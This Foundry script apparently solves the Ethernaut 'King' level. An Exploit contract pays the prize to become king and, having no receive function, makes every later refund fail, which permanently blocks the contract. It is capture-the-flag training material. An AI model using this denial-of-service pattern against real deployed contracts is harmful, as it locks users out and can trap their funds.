// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import {Script} from "forge-std/Script.sol";
import {King} from "src/09/King.sol";
import {KingFactory} from "src/09/KingFactory.sol";
import {Ethernaut} from "src/Ethernaut.sol";
import {HelperConfig} from "../HelperConfig.s.sol";
import {console, Test} from "forge-std/Test.sol";

contract KingExploit is Script {
    address public levelFactory;
    HelperConfig public config;
    uint256 constant MIN_ETH_AMOUNT = 0.001 ether;

    function run() external {
        if (block.chainid == 11155111) {
            levelFactory = vm.envAddress("LEVEL9_SEPOLIA_ADDRESS");
        } else {
            levelFactory = address(new KingFactory());
        }
        // Deploy a new instance using the level Address
        config = new HelperConfig{value: MIN_ETH_AMOUNT}(levelFactory);
        (address ethernaut, address payable instance, uint256 deployerKey) = config.activeNetworkConfig();

        vm.startBroadcast(deployerKey);

        // Break the contract
        uint256 prize = King(instance).prize();
        new Exploit{value: prize}(instance);

        // Submit results
        Ethernaut(ethernaut).submitLevelInstance(instance);
        (,, bool completed) = Ethernaut(ethernaut).emittedInstances(instance);
        require(completed == true, "Solution is not solving the level");

        vm.stopBroadcast();
    }
}

contract Exploit {
    constructor(address instance) payable {
        (bool success,) = instance.call{value: msg.value}("");
        require(success, "Failed to send Ether");
    }
}
